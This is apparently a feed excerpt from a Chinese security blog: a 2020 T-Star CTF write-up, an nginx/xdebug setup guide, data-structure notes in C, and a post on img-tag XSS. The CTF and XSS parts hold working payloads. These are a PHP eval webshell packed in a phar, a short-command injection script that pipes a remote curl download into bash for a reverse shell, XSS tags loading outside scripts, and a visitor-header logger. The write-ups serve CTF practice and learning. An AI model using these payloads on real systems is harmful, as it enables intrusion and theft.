    <title>2020腾讯犀牛鸟网络安全T-Star高校挑战赛wp</title>
    <link href="https://iloveflag.github.io/2020/07/01/2020%E8%85%BE%E8%AE%AF%E7%8A%80%E7%89%9B%E9%B8%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8T-Star%E9%AB%98%E6%A0%A1%E6%8C%91%E6%88%98%E8%B5%9Bwp/"/>
    <id>https://iloveflag.github.io/2020/07/01/2020%E8%85%BE%E8%AE%AF%E7%8A%80%E7%89%9B%E9%B8%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8T-Star%E9%AB%98%E6%A0%A1%E6%8C%91%E6%88%98%E8%B5%9Bwp/</id>
    <published>2020-07-01T01:42:09.000Z</published>
    <updated>2025-02-14T14:45:19.300Z</updated>
    
    <content type="html"><![CDATA[<h1 id="题目一-签到"><a href="#题目一-签到" class="headerlink" title="题目一 签到"></a>题目一 签到</h1><p>将木马先保存为jpg上传，burp改后缀<br> <img src="https://raw.githubusercontent.com/iloveflag/images/master/20200701095041116_5957.png" alt=""><br> <img src="https://raw.githubusercontent.com/iloveflag/images/master/20200701095119020_32310.png" alt=""></p><h1 id="题目二-命令执行基础"><a href="#题目二-命令执行基础" class="headerlink" title="题目二 命令执行基础"></a>题目二 命令执行基础</h1><p><img src="https://raw.githubusercontent.com/iloveflag/images/master/20200701095132764_28646.png" alt=""></p><h1 id="题目三-你能爆破吗"><a href="#题目三-你能爆破吗" class="headerlink" title="题目三 你能爆破吗"></a>题目三 你能爆破吗</h1><p>admin/admin进入发现cookie为admin的base64加密，cookie注入<br><img src="https://raw.githubusercontent.com/iloveflag/images/master/20200701095149013_29504.png" alt=""><br><img src="https://raw.githubusercontent.com/iloveflag/images/master/20200701095207165_15396.png" alt=""><br><img src="https://raw.githubusercontent.com/iloveflag/images/master/20200701095215491_5131.png" alt=""></p><h1 id="题目四-文件上传"><a href="#题目四-文件上传" class="headerlink" title="题目四 文件上传"></a>题目四 文件上传</h1><p>上传图片结合马，别名pht绕过，发现检测文件头&lt;?过滤，采用<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=’php’&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><br>,且php也过滤，双写绕过<br><img src="https://raw.githubusercontent.com/iloveflag/images/master/20200701095252196_12876.png" alt=""><br><img src="https://raw.githubusercontent.com/iloveflag/images/master/20200701095301003_27802.png" alt=""><br><img src="https://raw.githubusercontent.com/iloveflag/images/master/20200701095317540_10670.png" alt=""></p><h1 id="题目五-文件包含GetShell"><a href="#题目五-文件包含GetShell" class="headerlink" title="题目五 文件包含GetShell"></a>题目五 文件包含GetShell</h1><p>生成myphar.phar，改名为phar.txt上传<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> </span><br><span class="line">try&#123;</span><br><span class="line">    $p = new Phar(&quot;my.phar&quot;, 0, &#x27;my.phar&#x27;);</span><br><span class="line">&#125; catch (UnexpectedValueException $e) &#123;</span><br><span class="line">    die(&#x27;Could not open my.phar&#x27;);</span><br><span class="line">&#125; catch (BadMethodCallException $e) &#123;</span><br><span class="line">    echo &#x27;technically, this cannot happen&#x27;;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">$p-&gt;startBuffering();</span><br><span class="line">$p[&#x27;file1.txt&#x27;] = &#x27;file1&#x27;;</span><br><span class="line">$p[&#x27;file2.txt&#x27;] = &#x27;file2&#x27;;</span><br><span class="line">$p[&#x27;file3.txt&#x27;] = &#x27;file3&#x27;;</span><br><span class="line">$p[&#x27;shell.php&#x27;] = &#x27;&lt;?php eval($_POST[1]); ?&gt;&#x27;;</span><br><span class="line">$p-&gt;setStub(&quot;&lt;?php</span><br><span class="line">    Phar::mapPhar(&#x27;myphar.phar&#x27;); </span><br><span class="line">__HALT_COMPILER();&quot;);</span><br><span class="line"> </span><br><span class="line">$p-&gt;stopBuffering();</span><br><span class="line"> </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><br><img src="https://raw.githubusercontent.com/iloveflag/images/master/20200701095337954_27884.png" alt=""><br><img src="https://raw.githubusercontent.com/iloveflag/images/master/20200701095345939_14452.png" alt=""></p><h1 id="题目六-成绩单"><a href="#题目六-成绩单" class="headerlink" title="题目六 成绩单"></a>题目六 成绩单</h1><p>基础sql注入<br><img src="https://raw.githubusercontent.com/iloveflag/images/master/20200701095358059_18433.png" alt=""></p><h1 id="题目七-小猫咪踩灯泡"><a href="#题目七-小猫咪踩灯泡" class="headerlink" title="题目七 小猫咪踩灯泡"></a>题目七 小猫咪踩灯泡</h1><p>CVE-2017-12615<br><img src="https://raw.githubusercontent.com/iloveflag/images/master/20200701095407787_27931.png" alt=""></p><h1 id="题目九-分析代码获得flag"><a href="#题目九-分析代码获得flag" class="headerlink" title="题目九 分析代码获得flag"></a>题目九 分析代码获得flag</h1><p><a href="https://www.iloveflag.com/13/HITCON2017(babyfirst-revenge">HITCON2017(babyfirst-revenge)</a>%20writeup/)<br>当时长度还是小于5<br>找到当时复现的脚本bash反弹回来完事了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">from time import sleep</span><br><span class="line">from urllib.parse import quote</span><br><span class="line"></span><br><span class="line">payload = [</span><br><span class="line">    # generate `ls -t&gt;g` file</span><br><span class="line">    &#x27;&gt;ls\\&#x27;, </span><br><span class="line">    &#x27;ls&gt;_&#x27;, </span><br><span class="line">    &#x27;&gt;\ \\&#x27;, </span><br><span class="line">    &#x27;&gt;-t\\&#x27;, </span><br><span class="line">    &#x27;&gt;\&gt;g&#x27;, </span><br><span class="line">    &#x27;ls&gt;&gt;_&#x27;, </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#x27;&gt;bash&#x27;,</span><br><span class="line">    &#x27;&gt;\|\\&#x27;, #\\转义|</span><br><span class="line">    &#x27;&gt;86\\&#x27;,</span><br><span class="line">    &#x27;&gt;1\\&#x27;,</span><br><span class="line">    &#x27;&gt;8.\\&#x27;,</span><br><span class="line">    &#x27;&gt;3\\&#x27;,</span><br><span class="line">    &#x27;&gt;5.\\&#x27;,</span><br><span class="line">    &#x27;&gt;11\\&#x27;,</span><br><span class="line">    &#x27;&gt;7.\\&#x27;,</span><br><span class="line">    &#x27;&gt;4\\&#x27;,</span><br><span class="line">    &#x27;&gt;\ \\&#x27;, </span><br><span class="line">    &#x27;&gt;rl\\&#x27;, </span><br><span class="line">    &#x27;&gt;cu\\&#x27;, </span><br><span class="line">    # exec</span><br><span class="line">    &#x27;sh _&#x27;, </span><br><span class="line">    &#x27;sh g&#x27;, </span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">for i in payload:</span><br><span class="line">    assert len(i) &lt; 7 </span><br><span class="line">    r = requests.get(&#x27;http://c5b32990.yunyansec.com/?1=&#x27; + quote(i) )</span><br><span class="line">    print(r.url)</span><br><span class="line">sleep(0.2)</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/iloveflag/images/master/20200701095423603_17402.png" alt=""><br><img src="https://raw.githubusercontent.com/iloveflag/images/master/20200701095432075_26763.png" alt=""></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;题目一-签到&quot;&gt;&lt;a href=&quot;#题目一-签到&quot; class=&quot;headerlink&quot; title=&quot;题目一 签到&quot;&gt;&lt;/a&gt;题目一 签到&lt;/h1&gt;&lt;p&gt;将木马先保存为jpg上传，burp改后缀&lt;br&gt; &lt;img src=&quot;https://raw.githubu</summary>
      
    
    
    
    
    <category term="ctf" scheme="https://iloveflag.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>nginx-php-vscode-xdebug</title>
    <link href="https://iloveflag.github.io/2020/06/14/nginx-php-vscode-xdebug/"/>
    <id>https://iloveflag.github.io/2020/06/14/nginx-php-vscode-xdebug/</id>
    <published>2020-06-14T09:56:26.000Z</published>
    <updated>2025-02-14T14:45:19.314Z</updated>
    
    <content type="html"><![CDATA[<h1 id="edit-nginx-conf-to-run-php"><a href="#edit-nginx-conf-to-run-php" class="headerlink" title="edit nginx conf to run php"></a>edit nginx conf to run php</h1><p><img src="https://raw.githubusercontent.com/iloveflag/images/master/20200614154520930_4367.png" alt=""><br><img src="https://raw.githubusercontent.com/iloveflag/images/master/20200614155414216_2116.png" alt=""></p><h1 id="copy-phpinfo-to-https-xdebug-org-wizard-and-follow-the-command"><a href="#copy-phpinfo-to-https-xdebug-org-wizard-and-follow-the-command" class="headerlink" title="copy phpinfo(); to  https://xdebug.org/wizard and follow the command"></a>copy phpinfo(); to  <a href="https://xdebug.org/wizard">https://xdebug.org/wizard</a> and follow the command</h1><p><img src="https://raw.githubusercontent.com/iloveflag/images/master/20200614155511411_17708.png" alt=""></p><h1 id="add-this-code-to-etc-php-7-2-fpm-php-ini"><a href="#add-this-code-to-etc-php-7-2-fpm-php-ini" class="headerlink" title="add this code to  /etc/php/7.2/fpm/php.ini"></a>add this code to  /etc/php/7.2/fpm/php.ini</h1><p><img src="https://raw.githubusercontent.com/iloveflag/images/master/20200614155606433_19468.png" alt=""></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">zend_extension = /usr/lib/php/20170718/xdebug.so</span><br><span class="line">xdebug.remote_autostart = 1</span><br><span class="line">xdebug.remote_enable = 1</span><br><span class="line">xdebug.remote_handler = dbgp</span><br><span class="line">xdebug.remote_host = 127.0.0.1</span><br><span class="line">xdebug.remote_log = /tmp/xdebug_remote.log</span><br><span class="line">xdebug.remote_mode = req</span><br><span class="line">xdebug.remote_port = 9000 #this can be modified</span><br></pre></td></tr></table></figure><h1 id="install-php-debug-in-vscode-and-default-lauch-json-is-just-ok"><a href="#install-php-debug-in-vscode-and-default-lauch-json-is-just-ok" class="headerlink" title="install php debug in vscode and default lauch.json is just ok!"></a>install php debug in vscode and default lauch.json is just ok!</h1><p><img src="https://raw.githubusercontent.com/iloveflag/images/master/20200614155852200_20240.png" alt=""><br><strong>make sure the listen port is same</strong>(9000 there!)</p><h1 id="debug-it-in-firefox"><a href="#debug-it-in-firefox" class="headerlink" title="debug it in firefox!"></a>debug it in firefox!</h1><p><img src="https://raw.githubusercontent.com/iloveflag/images/master/20200614160142441_19912.png" alt=""></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;edit-nginx-conf-to-run-php&quot;&gt;&lt;a href=&quot;#edit-nginx-conf-to-run-php&quot; class=&quot;headerlink&quot; title=&quot;edit nginx conf to run php&quot;&gt;&lt;/a&gt;edit ngi</summary>
      
    
    
    
    
    <category term="运维" scheme="https://iloveflag.github.io/tags/%E8%BF%90%E7%BB%B4/"/>
    
  </entry>
  
  <entry>
    <title>数据结构-浙大版咕咕咕了</title>
    <link href="https://iloveflag.github.io/2020/06/13/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E6%B5%99%E5%A4%A7%E7%89%88%E5%92%95%E5%92%95%E5%92%95%E4%BA%86/"/>
    <id>https://iloveflag.github.io/2020/06/13/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E6%B5%99%E5%A4%A7%E7%89%88%E5%92%95%E5%92%95%E5%92%95%E4%BA%86/</id>
    <published>2020-06-13T12:00:00.000Z</published>
    <updated>2025-02-14T14:45:19.323Z</updated>
    
    <content type="html"><![CDATA[<p>下面咕咕咕了,看这个:<a href="/2021/11/06/数据结构-王道考研复习笔记">数据结构(王道考研复习笔记)</a></p><h1 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h1><h2 id="什么是数据结构"><a href="#什么是数据结构" class="headerlink" title="什么是数据结构"></a>什么是数据结构</h2><p><img src="https://raw.githubusercontent.com/iloveflag/images/master/20200613071108914_5875.png" alt=""><br>试一下在机器上运行的结果</p><p>source:</p><p><a href="https://github.com/iloveflag/PTA/blob/master/1.9.c">1.9.c</a></p><p><a href="https://github.com/iloveflag/PTA/blob/master/1.10.c">1.10.c</a></p><p><img src="https://raw.githubusercontent.com/iloveflag/images/master/20200625201904316_23119.png" alt=""><br>递归的空间占用大<br><img src="https://raw.githubusercontent.com/iloveflag/images/master/20200625203713627_13843.png" alt=""><br><img src="https://raw.githubusercontent.com/iloveflag/images/master/20200625203739692_8312.png" alt=""></p><p>source:<a href="https://github.com/iloveflag/PTA/blob/master/1.11.c">1.11.c</a></p><p>bug:<br><img src="https://raw.githubusercontent.com/iloveflag/images/master/20200626105216983_30513.png" alt=""><br><a href="http://kirste.userpage.fu-berlin.de/chemnet/use/info/libc/libc_17.html">CLK_TCK问题</a><br><img src="https://raw.githubusercontent.com/iloveflag/images/master/20200626105634219_11769.png" alt=""></p><p><a href="https://stackoverflow.com/questions/8671366/undefined-reference-to-pow-and-floor/8671381">pow问题</a></p><p><img src="https://raw.githubusercontent.com/iloveflag/images/master/20200626105848199_11247.png" alt=""></p><p>运行结果：<br><img src="https://raw.githubusercontent.com/iloveflag/images/master/20200626111338639_12178.png" alt=""><br><img src="https://raw.githubusercontent.com/iloveflag/images/master/20200626131135043_29513.png" alt=""></p><p>source:<a href="https://github.com/iloveflag/PTA/blob/master/1.12.c">1.12.c</a></p><p><img src="https://raw.githubusercontent.com/iloveflag/images/master/20200626131222269_10736.png" alt="2020-06-26_13-09-55"></p><h2 id="什么是算法"><a href="#什么是算法" class="headerlink" title="什么是算法"></a>什么是算法</h2><p><img src="https://raw.githubusercontent.com/iloveflag/images/master/20200712095219968_8318.png" alt=""><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">void PrintN(int N)&#123;</span><br><span class="line">    if(N)&#123;</span><br><span class="line">        PrintN(N-1);</span><br><span class="line">        printf(&quot;%d\n&quot;,N);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><script type="math/tex; mode=display">S(n)=C*N</script><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">double f1(int n,double a[],double x)</span><br><span class="line">&#123;   </span><br><span class="line">    int i;</span><br><span class="line">    double p = a[0];</span><br><span class="line">    for (i=1;i&lt;=n;i++)&#123;</span><br><span class="line">        p+=(a[i]*pow(x,i));</span><br><span class="line">    &#125;</span><br><span class="line">    return p;</span><br><span class="line">&#125;</span><br><span class="line">double f2(int n,double a[],double x)&#123;</span><br><span class="line">    int i;</span><br><span class="line">    double p = a[n];</span><br><span class="line">    for (i=n;i&gt;0;i--)&#123;</span><br><span class="line">        p=a[i-1]+x*p;</span><br><span class="line">    &#125;</span><br><span class="line">    return p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>f1复杂度</p><script type="math/tex; mode=display">T(n)=C1*n^2+C2*n</script><p>f2复杂度</p><script type="math/tex; mode=display">T(n)=C*n</script><p><img src="https://raw.githubusercontent.com/iloveflag/images/master/20200712100444453_25385.png" alt=""></p><p><img src="https://raw.githubusercontent.com/iloveflag/images/master/20200712100731724_28191.png" alt=""></p><h2 id="最大子列问题"><a href="#最大子列问题" class="headerlink" title="最大子列问题"></a>最大子列问题</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">int MaxSubseqSum1( int A[], int N )  </span><br><span class="line">&#123;   int ThisSum, MaxSum = 0;</span><br><span class="line">    int i, j, k;</span><br><span class="line">    for( i = 0; i &lt; N; i++ ) &#123; /* i是子列左端位置 */</span><br><span class="line">          for( j = i; j &lt; N; j++ ) &#123; /* j是子列右端位置 */</span><br><span class="line">                  ThisSum = 0;  /* ThisSum是从A[i]到A[j]的子列和 */</span><br><span class="line">                  for( k = i; k &lt;= j; k++ )</span><br><span class="line">                            ThisSum += A[k];</span><br><span class="line">                            if( ThisSum &gt; MaxSum ) /* 如果刚得到的这个子列和更大 */</span><br><span class="line">                                      MaxSum = ThisSum;    /* 则更新结果 */</span><br><span class="line">          &#125; /* j循环结束 */</span><br><span class="line">     &#125; /* i循环结束 */</span><br><span class="line">     return MaxSum;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><script type="math/tex; mode=display">T(N)=O(N^3)</script><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">int MaxSubseqSum2( int A[], int N )  </span><br><span class="line">&#123;   int ThisSum, MaxSum = 0;</span><br><span class="line">    int i, j;</span><br><span class="line">    for( i = 0; i &lt; N; i++ ) &#123; /* i是子列左端位置 */</span><br><span class="line">          ThisSum = 0;  /* ThisSum是从A[i]到A[j]的子列和 */</span><br><span class="line">          for( j = i; j &lt; N; j++ ) &#123; /* j是子列右端位置 */</span><br><span class="line">                  ThisSum += A[j];        /*对于相同的i，不同的j，只要在j-1次循环的基础上累加1项即可*/ </span><br><span class="line">                  if( ThisSum &gt; MaxSum ) /* 如果刚得到的这个子列和更大 */</span><br><span class="line">                            MaxSum = ThisSum;    /* 则更新结果 */</span><br><span class="line">          &#125; /* j循环结束 */    </span><br><span class="line">     &#125; /* i循环结束 */    </span><br><span class="line">     return MaxSum;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><script type="math/tex; mode=display">T(N)=O(N^2)</script><p>分而治之算法</p><p><img src="https://raw.githubusercontent.com/iloveflag/images/master/20200713050644375.png" alt=""><br>$T(N)=2T(N/2)+C*N$<br>$T(1)=O(1)$</p><p>在线处理算法<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">int MaxSubseqSum4( int A[], int N )  </span><br><span class="line">&#123;   int ThisSum, MaxSum;</span><br><span class="line">    int i;</span><br><span class="line">    ThisSum = MaxSum = 0;</span><br><span class="line">    for( i = 0; i &lt; N; i++ ) &#123;</span><br><span class="line">          ThisSum += A[i]; /* 向右累加 */</span><br><span class="line">          if( ThisSum &gt; MaxSum )</span><br><span class="line">                  MaxSum = ThisSum; /* 发现更大和则更新当前结果 */</span><br><span class="line">          else if( ThisSum &lt; 0 ) /* 如果当前子列和为负 */</span><br><span class="line">                  ThisSum = 0; /* 则不可能使后面的部分和增大，抛弃之 */</span><br><span class="line">    &#125;</span><br><span class="line">    return MaxSum;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><script type="math/tex; mode=display">T(N)=O(N)</script><h1 id="线性结构"><a href="#线性结构" class="headerlink" title="线性结构"></a>线性结构</h1><h2 id="线性表及其实现"><a href="#线性表及其实现" class="headerlink" title="线性表及其实现"></a>线性表及其实现</h2><h3 id="引子-多项式表示："><a href="#引子-多项式表示：" class="headerlink" title="引子-多项式表示："></a>引子-多项式表示：</h3><h4 id="方法1：顺序存储结构直接表示"><a href="#方法1：顺序存储结构直接表示" class="headerlink" title="方法1：顺序存储结构直接表示"></a>方法1：顺序存储结构直接表示</h4><p>$f(x)=4x^5-3x^2+1$<br><img src="https://raw.githubusercontent.com/iloveflag/images/master/20200714164452.png" alt="20200714164452.png"></p><h4 id="方法2：顺序存储结构表示非零项"><a href="#方法2：顺序存储结构表示非零项" class="headerlink" title="方法2：顺序存储结构表示非零项"></a>方法2：顺序存储结构表示非零项</h4><p><img src="https://raw.githubusercontent.com/iloveflag/images/master/image-20200722101518799.png" alt="image-20200722101518799"></p><h4 id="方法3：链表结构储存非零项"><a href="#方法3：链表结构储存非零项" class="headerlink" title="方法3：链表结构储存非零项"></a>方法3：链表结构储存非零项</h4><p><img src="https://raw.githubusercontent.com/iloveflag/images/master/image-20200722101912735.png" alt="image-20200722101912735"></p><h3 id="线性表的顺序存储实现："><a href="#线性表的顺序存储实现：" class="headerlink" title="线性表的顺序存储实现："></a>线性表的顺序存储实现：</h3><p><img src="https://raw.githubusercontent.com/iloveflag/images/master/image-20200722102912028.png" alt="image-20200722102912028"></p><p><img src="https://raw.githubusercontent.com/iloveflag/images/master/image-20200722103111856.png" alt="image-20200722103111856"></p><p><img src="https://raw.githubusercontent.com/iloveflag/images/master/image-20200722103432460.png" alt="image-20200722103432460"></p><h3 id="线性表的链式存储实现"><a href="#线性表的链式存储实现" class="headerlink" title="线性表的链式存储实现"></a>线性表的链式存储实现</h3><p><img src="https://raw.githubusercontent.com/iloveflag/images/master/image-20200722104009649.png" alt="image-20200722104009649"></p><p><img src="https://raw.githubusercontent.com/iloveflag/images/master/image-20200722104253400.png" alt="image-20200722104253400"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;下面咕咕咕了,看这个:&lt;a href=&quot;/2021/11/06/数据结构-王道考研复习笔记&quot;&gt;数据结构(王道考研复习笔记)&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&quot;基本概念&quot;&gt;&lt;a href=&quot;#基本概念&quot; class=&quot;headerlink&quot; title=&quot;基本概念&quot;&gt;&lt;/a&gt;基</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>from_img_to_xss</title>
    <link href="https://iloveflag.github.io/2020/01/16/from-img-to-xss/"/>
    <id>https://iloveflag.github.io/2020/01/16/from-img-to-xss/</id>
    <published>2020-01-15T23:12:50.000Z</published>
    <updated>2025-02-14T14:45:19.309Z</updated>
    
    <content type="html"><![CDATA[<p>2020.1.13 估计大家都看到了朋友圈疯狂传的某xss，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=1 onerror=alert(xss)&gt;</span><br></pre></td></tr></table></figure><p>self-xss自己日自己，当然对方修复也很快，再次输入时出现输入词出现敏感信息<br>但是当我测试输入一些html标签时，例如h1标签还是能渲染在页面上，那么可以断<br>定只是采用了黑名单的方式进行检测，并未对html标签进行实体编码，在img标签上<br>进行思考，舍弃后半部分onerror，只用src=，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;IMG SRC=javascript:alert(&#x27;XSS&#x27;)&gt;</span><br></pre></td></tr></table></figure><p>但是这是老的浏览器了，并不能造成xss<br>而且要绕过30字的限制，那么可以<br>利用短链接的形式获取（找的我都想氪金了）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;http://c7.gg/xxxxx&quot;&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>将src引入个人服务器域名上，在服务器上引入xss平台的payload，但是这种方式并不能获取有关信息<br>如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;img src=&#x27;http://115.29.170.243/index.php&#x27;&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;script src=http://t.cn/EGMdTfR&gt;&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>看到了这篇文章：<br><a href="https://bbs.ichunqiu.com/thread-48657-1-1.html">img标签之xss利用从放弃到OAuth授权劫持</a><br>例如在服务器上设置给xxx转账或者登录的链接<br>（并没有找到目标），不过记录下用户浏览器头部还是可以的<br>简单的POC：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">echo date(&quot;Y-m-d-H:i:s&quot;);</span><br><span class="line">$USER_AGENT =&#x27; USER_AGENT:&#x27;.$_SERVER[&#x27;HTTP_USER_AGENT&#x27;].PHP_EOL;</span><br><span class="line">$REMOTE_USER = &#x27; REMOTE_USER&#x27;.$_SERVER[&#x27;REMOTE_USER&#x27;].&#x27;\n&#x27;;</span><br><span class="line">$REMOTE_ADDR = &#x27; REMOTE_ADDR&#x27;.$_SERVER[&#x27;REMOTE_ADDR&#x27;].&#x27;\n&#x27;;</span><br><span class="line">$HTTP_REFERER = &#x27; HTTP_REFERER&#x27;.$_SERVER[&#x27;HTTP_REFERER&#x27;].&#x27;\n&#x27;;</span><br><span class="line">file_put_contents(&#x27;test/site.txt&#x27;, $USER_AGENT.$REMOTE_USER.$REMOTE_ADDR.$HTTP_REFERER,FILE_APPEND);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>在发送img标签后，在服务器上可以看到记录的user_agent等</p><p>提交给src后已经重复了，不知道还有没有更高端的玩法QAQ</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;2020.1.13 估计大家都看到了朋友圈疯狂传的某xss，&lt;/p&gt;
&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;</summary>
      
    
    
    
    
    <category term="rubbish" scheme="https://iloveflag.github.io/tags/rubbish/"/>
    
  </entry>
  
  <entry>
    <title>hash_hmac_php_bug</title>
    <link href="https://iloveflag.github.io/2019/12/26/hash-hmac-php-bug/"/>
    <id>https://iloveflag.github.io/2019/12/26/hash-hmac-php-bug/</id>
    <published>2019-12-26T07:08:58.000Z</published>
    <updated>2025-02-14T14:45:19.310Z</updated>
    
